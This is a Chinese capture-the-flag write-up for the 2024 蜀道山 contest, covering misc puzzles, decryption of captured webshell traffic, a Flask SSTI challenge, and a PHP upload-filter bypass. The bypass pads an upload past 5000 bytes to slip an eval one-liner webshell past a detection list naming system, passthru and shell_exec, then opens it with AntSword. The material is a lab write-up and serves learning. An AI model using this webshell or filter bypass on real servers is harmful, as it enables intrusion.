@@ -1,0 +1,336 @@
+---
+title: '2024 蜀道山 CTF Writeup'
+description: '文件末尾隐藏 ZIP'
+pubDate: 2024-11-20
+author: 'IHK-1'
+tags: ['CTF', '蜀道山', '2024']
+---
+
+# MISC
+## 元素战争
+```python
+from pwn import *
+
+conn = remote("gz.imxbt.cn",20968)
+print(conn.recv().decode())
+print(conn.recv().decode())
+
+while True:
+    conn.sendline(str(randint(1,5)).encode())
+    print(conn.recv().decode())
+```
+
+<!-- 这是一张图片，ocr 内容为：你的选择是:水 敌人的选择是:木 水生木,玩家恢复生命! 你的血量:17,敌人的血量:1 请选择你的元素(1.金,2.木,3.水,4.火,5.土): 你的选择是:金 敌人的选择是:木 金克木,玩家获胜! 你的血量:17,敌人的血量:0 你获得了胜利!敌人已被击败! 欢迎拿到FLAG:LZSDS{D72742B3-0362-4A47-B6CA-AD7D073DCFE9] -->
+![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1732681250684-6740523c-b2ae-4991-95b7-0e0ea2d8758f.png)
+
+## Summit 马铃薯（×）
+文件末尾隐藏 ZIP
+
+<!-- 这是一张图片，ocr 内容为：010 EDITOR-C\USERS\HK\DESKTOPLCHALLENGE\POTATO.PNG 工具D窗口W帮助(帮助H) 文件D编信()搜索(S)视图N格式O)牌本D模板U)调试D)项目(D) ABL 重少家 MOV 起始页 POTATO.PNG* OUT.ZIP 0123456789ABCDEF AY日万 BMAGK 7484 61815 78 47 F9 B EF  XGUE6AUW Y,JI~+I HTANG00608年打88F GE0818年4000斤340 FE DC 8E 02 7D 61816 UZ.660% EFIU WH) BE 48 B6 DB 61817 WKG,:YUOOUUG..U 44 2C 14 61818 HIL 080000 61819 60 8 00 21 00 50 LGEGG PK. 98050000 61820 A4 04 CF 13000000 A.IEB.. 5F 54 79 70 65 7 61821 5B 43 6F [CONTENT TYPES]. 73 5D 2E 30 14 86 EF 4D 7C 87 A5 XMLA'NNAO.LIM|#Y 61822 78 6D 6C 61823 B7 64 28 70 817AA924 E2 03 D4 F6 DTPADEAP.20SA.00 DE B3 81 C4 18 DC 42 58 C 35 74 6D ESTMOS,PP ,A,UBX 61824  8C 75 DD 99 CC 76 95 49 B6 ARSIEYYBUY 2 CD9A ED 61825 09  58 P:,S06D.XE"40% 61826 10 50 3B 9B 8 E9 B6 AB 9C BD 竖884 20 55. 7B 6C OF C8 66 61827 2F 9F D3 /YO - .A A AL EF 61828 D3 DB 9B C9 19A37FE0 00 ERI..RCIY.E.A 95 5C A8 44 A4 DB BO 61829 IC 65 09 TE. AIY T) DOU 模板结果-PNG.BTE 开始 注释 大小 颜色 名称 ZUU4N LUUUUN IDAI (CNUCAL, PUDLIC,UNSARE TO COPY) SIRUCT PING CHUINK CNUNKLOJ TGF 30004H STRUCT PNG CHUNK CHUNK[7] IDAT (CRITICAL,PUBLIC.UNSAFE TO COPY) 10000H FG: BG IDAT (CRITICAL,PUBLIC,UNSAFE TO COPY) 40004H STRUCT PNG CHUNK CHUNK[8] 10000H FG: STRUCT PNG CHUNK CHUNK(9] 50004H IDAT (CRITICAL,PUBLIC.UNSAFE TO COPY) 10000H BG FG: 10000H 60004H IDAT (CRITICAL,PUBLIC,UNSAFE TO COPY) BG STRUCT PNG CHUNK CHUNK[10] FG 70004H 10000H IDAT (CRITICAL,PUBLIC.UNSAFE TO COPY) BG STRUCT PNG CHUNK CHUNK[11] 10000H 80004H IDAT (CRITICAL,PUBLIC,UNSAFE TO COPY) BG STRUCT PNG CHUNK CHUNK[12] FG 90004H IDAT (CRITICAL,PUBLIC,UNSAFE TO COPY) STRUCT PNG CHUNK CHUNK[13] 10000H BG FG A0004H IDAT (CRITICAL,PUBLIC.UNSAFE TO COPY) STRUCT PNG CHUNK CHUNK(14] 10000H BG FG B0004H IDAT (CRITICAL,PUBLIC,UNSAFE TO COPY) 10000H  STRUCT PNG CHUNK CHUNK(15] BG FG: C0004H IDAT (CRITICAL,PUBLIC,UNSAFE TO COPY) 10000H STRUCT PNG CHUNK CHUNK[16] BG FG  STRUCT PNG CHUNK CHUNK(17] D0004H IDAT (CRITICAL PUBLIC,UNSAFE TO COPY) 10000H BG FG: E0004H IDAT (CRITICAL,PUBLIC,UNSAFE TO COPY) STRUCT PNG CHUNK CHUNK[18] 10000H BG FG: F0004H IDAT (CRITICAL,PUBLIC,UNSAFE TO COPY) STRUCT PNG CHUNK CHUNK[19] 1792H FG F1796H IEND (CRITICAL,PUBLIC,UNSAFE TO COPY) STRUCT PNG CHUNK CHUNK(20] CH FA (CRITICAL,PUBLIC,UNSAFE TO COPY) F17A2H OH FG STRUCT PNG CHUNK CHUNK[21] BG -->
+![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1732681411810-e2e86a68-93d2-420e-84c4-fbe523f1c4cd.png)
+
+xlsx 中 media 中有一个 Zenith.png
+
+<!-- 这是一张图片，ocr 内容为：OUT.ZIP -BANDIZIP (STANDARD) 文件(月)编辑(E)查找(I)选项(O)视图(V)工具(T)帮助(H) X 您想用BANDIZIP打开7Z文件吗? 删除 测试 查看 新建 添加 打开 代码页 扫描 解压 OUT.ZIP 名称 RELS DOCPROPS ZENITH.PNG IX RELS MEDIA THEME WORKSHEETS -->
+![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1732681474319-61586051-c098-407d-8cc7-9eecca1b9cec.png)
+
+<!-- 这是一张图片，ocr 内容为：XOR SCHEME KEY UTF8 STANDARD ZENITH NULL PRESERVING -->
+![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1732681477348-02eb4b8b-316e-42a5-af32-cc80290352b4.png)
+
+对 key.bin 分析 为蔚蓝的 地图
+
+<!-- 这是一张图片，ocr 内容为：文件旧 编辑(S) 视图W)格式(O) 脚本(O) 模板L) 调 Q 工具O 模板() 窗口W) 帮助(H) 调试(D) 项目(D) CELESTE MAP 圈一 I MOV "X 工作区 词典 图片 网页 起始页 KEY.BIN 视频 学术 OUT.ZIP A46纤766: 8568044857 0123456789ABCDEF 文件 路径 94846646874300万M70724 .CELESTE MAP.%.. 045050 123456780 打开的文件 约14.400.000个结果 E6F6E NONE.AMBIENCEPR SENGE8767 677265 CAUSE...LENGE OGRESS.ALT MUSIC KEY.BIN 75 6E 64 6172 6B 65 UNDERWATER.DARK F:MIS...DITOR\ OUT.ZIP CELESTEMAP的图片 77 6E 54 6267156469 ANMANI .BG.DISABLEDOWNT CAUSE...LENGEL POTATO.PNG 61 67 08  5F 616E73 69 6974 RANSITION.FLAG. 9100 项目 61636B61676 765 72 54 65 78 PACKAGE.INNERTEX 它6768860AGNG 056C657665 7065720B 56C T.LEVEL.WHISPER. 工作区 资源管理器 项目 79 75 73 69 63 4C 6D 75 73 69 61 MUSICLAVER1.MUSI 9012345 第8万4464 SBNMEGAN50 4667876446 4C 61 79 65 5473 0B 6D 72 32 CLAYER2.SOLIDS.M 检查器 75 73 69 63 它888346333 7369 第426468441 79 61 USICLAYER3.MUSIC 61 79 类型 HESGB80000 值 05 77 69 64 SU877677 LAYER4.SPACE.WID 7800000 68 790B7769 TH.HEIGHT.X.Y.WI 二进制 01101001 64 6D 65 72 61 NDPATTERN.CAMERA 99 63 08616D 有符号字节 OFFSETX.MUSIC.AM 105 16 62 69 61 636B67 BIENCE.MAP.BACKG 无筹号字节 17 72 6F 105 726F756E ROUNDS.FOREGROUN 9% 可视化 变量 检查器 18 64 73 656C73OD DS.STYLE.LEVELS. 查找结果 值 地址 多文件中查找 查找结果 校验和 直方图 WOV 反汇编器 比较 进程 包爱盖 十六进制(H)ANSI小端 位置:69[45HL 值:105 69H 大小:2.201 -->
+![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1732681618385-9287517c-02a1-4468-9eee-37fec85e95be.png)
+
+实在没有蔚蓝，故卡住
+
+## javaPcap
+<!-- 这是一张图片，ocr 内容为：HTTP 192.168.127.74 139.199.77.49  272 GET /SHELL7EN .715940 J-D2HVYHLP3KEY-6432687659573170BENCRYPTMETHOD-AES HTTP/1.1 192:199:12494 90 HTTP/1.1 200 OK ,833494 192.168.127.74 278 GET /SHELL7CND-BL J-BHMGLMFSDASKEY-52484D674C5746736441AENCRYPTHETHOD*SN4 HTTP/1.1 139.199.77.49 ,901237 139.199.77.49 366 HTTP/1.1 208 OK 139.199.77.49 192.168.127.74 286 GET /SHELL7CRD-BIONEZIICHZY85KEY~62484D675A6D78685A79388ENCRYPTMETHOD-DLOWFISH HTTP/1.1 98HTTP/12000K 132:199:127174 192.168.127.74 175549 538 HTTP/1.1 200 OK 192.168.127.74 113 11.409201 317GET/SHELL7CND`Y 139.199.77.49 11/CND-YZFBIGZSYHCVAGLUACSQEHAKEY-S9334630494750735957837857852478C7564433530558ENCRETRETHOG-304 HTT/ HTTP 258 HTTP/1.1 200 OK 120  11-512263 139.199.77.49 -->
+![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1732683722021-7e7a396b-1d3b-4b26-8706-018f4a89e2b6.png)
+
+分析流量以及 jar 包，发现仅仅为简单的加解密，且 key 明文 密文 都是明文传输
+
+其中 blowfish 部分的 使用 cyberchef 解密不开，需要写脚本
+
+```python
+from Crypto.Cipher import Blowfish
+from base64 import b64decode
+import struct
+
+def decrypt_blowfish(key, encrypted_content):
+    key_size = 16
+    key_bytes = key.encode('utf-8')[:key_size]
+    key_bytes = key_bytes.ljust(key_size, b'\0')
+
+    cipher = Blowfish.new(key_bytes, Blowfish.MODE_ECB)
+
+    encrypted_bytes = b64decode(encrypted_content)
+    decrypted_bytes = cipher.decrypt(encrypted_bytes)
+
+    pad_len = decrypted_bytes[-1]
+    decrypted_bytes = decrypted_bytes[:-pad_len]
+
+    return decrypted_bytes.decode('utf-8')
+
+key = "596d467a5a54593049475a73595763765a6d78685a793536615841"
+encrypted_content = "bCvVthlhq6kihQdSBv2WzUZfeSGvRMigmsAMsdEtYOKW577HPZqinI5hlkRNE33xwgwWyWseoI8oERTQEnfoRXc5dJAWtwF+CTkmcoeeu5ccy7Qjp/cJA2Slj/UJDC6UWgvagkU3OYuFIELSc1x6etggbESl2Ug0dwUk3hO/xpYGxgQPCXnzciXSTCmlCq5Wr2EPXNG3wE/+NCpeHDe2WTbyPylOunr7/NWFy+flv0plvq29HzGo7lx4clpnEBKhWV91U7S+Fm5PUy69Aer4mC64NUcNf7m9jKcKeMvQQv5OPU5L6OayrJuh8eBPRjenb1A+JKZGYQK3j7xyNJ30r1F20E+EyZNM/JWcPImyXdh/aebRvlqWH99FoIJZhRhh2lbA6ZXXNwKxx0tZI5IFyH6m5DaUGKe/NN0rZbLCNFZoW93VEPiYwoM94R9uEolHvKjIQlP8qDStic5oXH/UoA=="
+
+try:
+    decrypted_content = decrypt_blowfish(key, encrypted_content)
+    print("Decrypted content:", decrypted_content)
+except Exception as e:
+    print("Decryption error:", str(e))
+
+```
+
+```plain
+>> whoami
+root
+
+>> ls -al
+total 5492
+drwx------ 18 root root    4096 Nov  6 15:26 ..
+drwxr-xr-x  3 root root    4096 Nov  4 17:22 .
+drwxr-xr-x  2 root root    4096 Nov  4 17:22 flag
+-rw-r--r--  1 root root 5610013 Nov  4 16:28 SimpleHttpServer.jar
+
+>> ls flag/
+flag.zip
+hint.txt
+
+>> base64 flag/flag.zip
+UEsDBBQACQAIABSGZFkAAAAAAAAAACsAAAAIACkAZmxhZy50eHRVVAkABWiKKGeQGitndXgLAAEE
+AAAAAAQAAAAAeGwJAAcUAwAAAADtgXBFs0Lb8F43+KxCxq77A+Zya0CyhPRERubzgNwf5fF5GVjt
+ntPQZe8hy0s4qLAhBXW42FAs5Xhw4lBLBwiHHE6JOQAAACsAAABQSwECFAMUAAkACAAUhmRZhxxO
+iTkAAAArAAAACAAcAAAAAAAAAAAA7YEAAAAAZmxhZy50eHRVVAkABWiKKGeQGitndXgLAAEEAAAA
+AAQAAAAAUEsFBgAAAAABAAEAUgAAAJgAAAAAAA==
+
+>> cat flag/hint.txt
+密码为执行命令（按照时间排序）的首字母的组合重复三次，比如执行了（id,whoami），那么密码就为iwiwiw
+
+wllbcwllbcwllbc
+```
+
+## 神奇的硬币纺纱机
+```python
+from pwn import *
+
+conn = remote("gz.imxbt.cn",20973)
+print(conn.recv().decode())
+print(conn.recv().decode())
+
+while True:
+    conn.sendline(str(randint(0,1)).encode())
+    print(conn.recv().decode())
+```
+
+# WEB
+## my_site
+文件说明是使用 Python 开发的 web 网站，首先对网站进行扫描，发现开启了 console
+
+其中它的 host 使用 127.0.0.1 进入
+
+<!-- 这是一张图片，ocr 内容为：BURP SUITE专业版 V2024.2.1 - L - LCENSED TO LEON406 BURP项目 查看 帮助 重放器 X INTRUDER O搜索 日志 扩展学习 目标 设置 编码工具 仪表盘 COLLABORATOR 代理 ORGANIZER SEQUENCER 重放器 十 目标:HTTP://GZ.IMXBT.CN:20974 发送 取消 V HTTP/1 三 X INSPECTOR 88 请求 响应 2 页面渲染 美化 请求属性 美化 HEX RAW RAW HEX GET/CONSOLE HTTP/L.L 0 请求查询参数 HOST:127.0.0.1 USER-AGENT:HOZILLA/5.0 (WINDOUS NT LO.0; WIN64: X64: RV:132.0) INTERACTIVE CONSOLE GECKO/20100101 FIREFOX/132.O 请求主体参数 ACCEPE:TEXE/HTML,APPLICATION/XHTML+XML,APPLICATION/XML:Q-0.9,*/*;Q10.0 ACCEPT-LANGUAGE: 恩 INTHIS ZH-CN,ZH;Q`0.G,ZH-TU;Q~0.7,ZH-HK;Q-0.5,EN-US;Q-0.3,EN;Q*0.2 CONSOLE LOCKED 请求COOKIES ACCEPT-ENCODING: QZIP, DEFLATE, BE 笔记 APPLIC CONNECTION:CLOSE THE CONSOLE IS LOCKED AND NEEDS TO BE UNLOCKED BY UPGRADE-INSECURE-REQUESTS: L 请求头 ENTERING THE PIN.YOU CAN FIND THE PIN PRINTED OUT ON PRIORITY:U'O,I THE STANDARD OUTPUT OF YOUR SHELL THAT RUNS THE SERVER. PIN: CONFIRM PIN TERPRETER. 0高亮 搜索 1,738字节|48 MILLIS 完成 内存:207.2MB EVENT LOG(1) ALL ISSUES (6) -->
+![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1732685721148-fac08e5e-bf92-49e9-8f44-f961b4366a22.png)
+
+返回原来页面查看是否存在 SSTI 或者任意文件读取
+
+<!-- 这是一张图片，ocr 内容为：HOME MESSAGE BOARD  WRITE YOUR MESSAGE HERE... POST MESSAGE TEST:ADA TEST:ADA TEST: TEST:{1) TEST: 7*7 TEST:{%7%] [7*7] TEST: TEST:{7*7) TEST:{%7%] LOGOUT -->
+![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1732685876462-347634f4-d11f-42fb-80e2-8b937c4d30b3.png)
+
+写不出来，后面搜了 WP 比赛的时候给了源码
+
+```python
+from flask import Flask, abort, render_template_string, request, render_template, redirect, url_for, session, flash, g
+from utils import rot13, key
+import sqlite3
+
+app = Flask(__name__)
+app.secret_key = 'your_secret_key'
+app.config['DATABASE'] = 'database.db'
+
+def get_db():
+    db = getattr(g, '_database', None)
+    if db is None:
+        db = g._database = sqlite3.connect(app.config['DATABASE'])
+    return db
+
+@app.teardown_appcontext
+def close_connection(exception):
+    db = getattr(g, '_database', None)
+    if db is not None:
+        db.close()
+
+@app.route('/')
+def home():
+    return render_template('home.html')
+
+@app.route('/rot13', methods=['GET', 'POST'])
+def rot13_route():
+    if request.method == 'POST':
+        action = request.form['action']
+        text = request.form['text']
+        
+        if action == 'encrypt':
+            encrypted_text = rot13(text)
+            return redirect(url_for('rot13_result', result=encrypted_text, action='encrypt'))
+    
+        
+        elif action == 'decrypt':
+            text = request.form['text']
+            decrypted_text = rot13(text)
+            if key(decrypted_text):
+                template = '<h1>Your decrypted text is: {{%s}}</h1>' % decrypted_text
+                try:
+                    render_template_string(template)
+                except Exception as e:
+                    abort(404)
+                # return "既然你是黑阔，那我凭什么给你回显"
+                return redirect(url_for('rot13_result', result="既然你是黑阔，那我凭什么给你回显", action='decrypt'))
+
+            else:
+                return redirect(url_for('rot13_result', result=decrypted_text, action='decrypt'))
+                template = '<h1>Your decrypted text is: %s</h1>' % decrypted_text
+                return render_template_string(template)
+    
+    return render_template('index.html')
+
+@app.route('/rot13_result/<action>/<result>')
+def rot13_result(action, result):
+    return render_template('rot13_result.html', action=action, result=result)
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        db = get_db()
+        cursor = db.cursor()
+        cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
+        user = cursor.fetchone()
+        if user:
+            session['username'] = username
+            return redirect(url_for('message_board'))
+        else:
+            flash('Invalid username or password')
+    return render_template('login.html')
+
+@app.route('/register', methods=['GET', 'POST'])
+def register():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        db = get_db()
+        cursor = db.cursor()
+        try:
+            cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
+            db.commit()
+            flash('Registration successful! Please log in.')
+            return redirect(url_for('login'))
+        except sqlite3.IntegrityError:
+            flash('Username already exists!')
+    return render_template('register.html')
+
+@app.route('/message_board', methods=['GET', 'POST'])
+def message_board():
+    if 'username' not in session:
+        return redirect(url_for('login'))
+    
+    db = get_db()
+    cursor = db.cursor()
+    
+    if request.method == 'POST':
+        message = request.form['message']
+        cursor.execute("INSERT INTO messages (username, message) VALUES (?, ?)", (session['username'], message))
+        db.commit()
+    
+    cursor.execute("SELECT username, message FROM messages")
+    messages = cursor.fetchall()
+    
+    return render_template('message_board.html', messages=messages)
+
+@app.route('/logout')
+def logout():
+    session.pop('username', None)
+    return redirect(url_for('home'))
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000, debug=True)
+```
+
+存在 SSTI
+
+<!-- 这是一张图片，ocr 内容为：ELIFACTIONEDECRYPT  TEXT - REQUEST.FORM['TEXT']  DECRYPTED_TEXT - ROT13(TEXT) IF KEY(DECRYPTED_TEXT): IF WAF(DECRYPTED_TEXT): TEMPLATE : ' CH1>YOUR DECRYPTED TEXT IS: (F%SH</H1>' % DECRYPTED_TEXT TRY RENDER_TEMPLATE_STRING(TEMPLATE) EXCEPT EXCEPTION AS E: ABORT(404) RETUM REDIRECT(URL.FOR(ROT13.PESULT',RESULT三'既然你是黑图;那我先什么给你回显", RESULT') ELIF W F WAF(DECRYPTED_TEXT)FALSE: ", ACTION:'DECRYPT')) RETURN NEDINECT(UNL_FON('ROT13.RESULT',NESULT-"我这里是有WAF哦", AC ELSE: REDIRECT(URL-FOR('ROT13.RESULT', RESULT-DECRYPTED_TEXT, ACTION-'DECRYPT') RETURN -->
+![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1732686476191-e159086c-43b8-47f5-af53-c6a8f6b64cf2.png)
+
+那个 key 平台没给，大致是触发 key 触发渲染，然后 SSTI 内存马
+
+## 奶龙牌WAF
+phpinfo 可以使用 /. 进行绕过
+
+<!-- 这是一张图片，ocr 内容为：BURP SUITE专业版 V2024.2.1 - LICENSED TO LEON406 BURP 项目 查看 帮助 重放器 X INTRUDER O搜索 日志 扩展学习 目标 设置 编码工具 COLLABORATOR 重放器 代理 仪表盘 SEQUENCER ORGANIZER 3 X 5 X 十 目标:HTTP://GZ.IMXBT.CN:20992 发送 取消 HTTP/1 三 X INSPECTOR 88 请求 响应 页面追染 2 美化 请求属性 美化 HEX RAW RAW HEX HTTP/1.1 200 OK POST /NAME TEST.PHP/. HTTP/1.1 请求查询参数 HOST:GZ.IMCBT.CN:20992 DATE:VED,27 NOV 2024 08:33:41 GHT USER-AGENT: HOGLLA/5.O (VINDOUS NT 10.0: WIN64; XE4; RV:132.0) SERVER:APACHE/2.4.54 (DEBIAN) X-POVERED-BY:PHP/7.4.33 GECKO/20100101 FLREFOX/132.D 5 请求主体参数 CONTENT-LENGTH:26 ACCEPT: TEXE/HTML,APPLLCATION/XHTML+XML,APPLICATION/XZEL:Q-0.9,*/*:Q-0.3 CONNECTION: CLOSE ACCEPT-LANGUAGE: 圆 CONTENT-TYPE:TEXT/HTML;CHARSET-UTF-8 ZH-CN,ZH;Q-0.8,ZH-TW;Q-0.7,ZH-HK;Q-0.5,EN-US;Q-0.3,EN;Q-0.2 请求COOKIES 笔记 ACCEPT-ENCODING: GZIP, DEFLATE, BR ATRAYODODOOO CONTENT-TYPE:MULTIPART/TORM-DATA; --------416510532241168296481392630353 BOUNDARY--------------- 13 请求头 CONTENT-LENGTH:22 ORIGIN:HTTP://GZ.IMXBT.CN:20992 6 响应头 CONNECTION:CLOSE RETERER:HTTP://GZ.1MXBT.CN:20992/ COOKIE:SESSION EYJLE2VYBMFTZSI6INRLC3QIFO.ZOAVOG.JTLQ3UZLZOD84VEFY1P9LPSLPBTOI UPGRADE-INSECURE-REQUESTS:1 PRIORITY:U ------------------------------416510532241168296481392630353 CONTENT-DISPOSITION: TORM-DATA; NAME:"UPLOAD FILE"; TILENAINEE"DATA" CONTENT-TYPE:IMAGE/PNG 416510532241168296481392630353-- 22 不允许上传此类文件! 0高亮 0高亮 219字节|38 MILLIS 完成 ALL ISSUES (41) 内存:239.2MB EVENT LOG(6) -->
+![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1732696427014-4facfefb-5eac-474e-bece-b24021b324ec.png)
+
+对于内容部分
+
+<!-- 这是一张图片，ocr 内容为：$FILE_CONTENT FILE_GET_C T_CONTENTS($FILE['TMP_NAME'], FALSE, NULL, 0, 5000); $DANGEROUS_PATTERNS '/\?PHP/I', /\\?-/', '/\?XML/', '/B(EVALLBASEBA,DECODELEXECISHELL EXECISYSTEMLPASSTEMLPASSTHRULPROC_OPENLPHP:V/FILTERIPHP.VALUEL '/B(SELECT/INSERTLUPDATELDELETELDROPLUNION  FROMLFROMLUHERELHAVING/LIKE INTO/TABLE/SET/VALUES)\B/I' (--\S/'. '/#/'. '/<SCRIPT\B.*?>.*?<\/SCRIPT>/IS', '/JAVASCRIPT:/I', "/ON\W+\S*-\S*["\'].*["\'\/I', (,/[-1.1111.1.1<1>{/, '/%[0-9A-FA-F]{2}/', '/&#[0-9]{1,5};/', '/&#X[0-9A-FA-F]+;/', '/SYSTEM\(/I', '/EXEC\(/I', '/PASSTHRU\(/I', '/SHELL EXEC\(/I', '/FILE GET CONTENTS\(/I', '/FOPEN\(/I', '/FILE_PUT_CONTENTS\(/I', '/%U[0-9A-F]{4]/I', '/[\X00-\X7F]/'', //检测路径穿越 ,//V.1/. FOREACH ($DANGEROUS_PATTERNS AS $PATTERN) IF (PREG_MATCH($PATTERN, $FILE_CONTENT)) { DIE("内容包含危险字符,上传被奶龙拦截!"); -->
+![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1732696495075-974714af-650a-4820-b516-5a2308e46056.png)
+
+他的写入文件逻辑并不是将 file_contents 的内容写入本地，所以可以使用超过 5000 个字符绕过  file_contents 截取的内容即可，或者使用 100万次溯回进行绕过
+
+<!-- 这是一张图片，ocr 内容为：BURP SUITE专业版 V2024.2.1 - LICENSED TO LEON406 BURP 项目 查看 帮助 重放器 INTRUDER O搜索 日志 扩展学习 目标 编码工具 设置 COLLABORATOR 重放器 代理 仪表盘 ORGANIZER SEQUENCER 3 X 5 X 十 目标:HTTP://GZ.IMXBT.CN:20992 41 发送 取消 HTTP/1 三 X INSPECTOR 88 请求 响应 M50 页面渲染 2 美化 请求属性 美化 HEX RAW HEX RAW HTTP/1.1  200 OK AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AASASAAASASAAAAAASSSASASASSSAASASSASAASSSSSASASSASSASSSSSSASSAASSSSAASSS 请求查询参数 DATE:VED,27 NOV 2024 08:37:26 GHT SERVER:APACHE/2.4.54 (DEB1AN) X-POVERED-BY:PHP/7.4.33 请求主体参数 CONTENT-LENGEH:26 CONNECTION:CLOSE 圆 CONTENT-TYPE:TEXT/HTML;CHARSET-UTP-8 请求COOKIES 笔记 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 13 请求头 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 6 响应头 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(7PHP BEVAL($ POST[SHELL):7> ----416510532241168296481392630353-- 22 不允许上传此类文件! 0高亮 0高亮 219字节|42 MILLIS 完成 ALL ISSUES(41) 内存:239.0MB EVENT LOG(6) -->
+![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1732696653687-4e67b772-97f7-499c-a8d7-dc0833606053.png)
+
+写入成功，一句话连接即可
+
+<!-- 这是一张图片，ocr 内容为：中国蚁剑 X 调试 ANTSWORD编辑窗口调 11918824024 编辑://FLIIL_AAAAA_GGGG 用此编码打开 三高亮 日保存 刷新 /FLM_AAAAA_GGGG LZSDS{441B6CDA-DACC-4F69-BEB1-BD7B4C9940B5} -->
+![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1732696713837-ddfc55ef-a7c1-4295-8379-8508af9799b7.png)
+
+## 恶意代码检测器（复现）
+<!-- 这是一张图片，ocr 内容为：请求 响应 M5川 M5川 美化 美化 页面渲染 HEX HEX RAW RAW HTTP/1.1 200  OK GET HTTP/1.1 DATE: WED, 27 NOV 2024 08:39:03 GMT HOST:GZ.IMXBT.CN:20997 USER-AGENT: HOZILLA/5.0 (WINDOWS NT 10.0; WIN64; X64; RV:132.0) 3SERVER:APACHE/2.4.54 (DEBIAN) 4 X-POWERED-BY: PHP/7.4.33 GECKO/20100101 FIREFOX/132.0 SV VARY:ACCEPT-ENCODING I ACCEPT: TEXT/HTML,APPLICATION/XHTML+XML,APPLICATION/XMLIQWO.9,*/*;QMO. 87890 CONTENT-LENGTH:2801 ACCEPT-LANGUAGE: ZH-CN,ZH;Q-0.8,ZH-TW;Q-0.7,ZH-HK;Q-0.5,EN-US;Q-0.3,EN;Q-0.2 CONNECTION: CLOSE CONTENT-TYPE:TEXT/HTML;CHARSET-UTF-8 ACCEPT-ENCODING: GZIP, DEFLATE, BR CONNECTION: CLOSE 8 COOKIE:SESSION <!DOCTYPE HTML> FO 70AWNCR 4TICRU7L2ONG4VERULPALNGTTOT 十 X 恶意代码检测器 GZ.IMXBT.CN:20997 ABOUT:BLANK 恶意代码检测 请输入恶意代码... -->
+![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1732696767175-bbc90ae3-42a2-4450-8182-d5eb3f8824ea.png)
+
+服务器为 apache，对服务器进行扫描
+
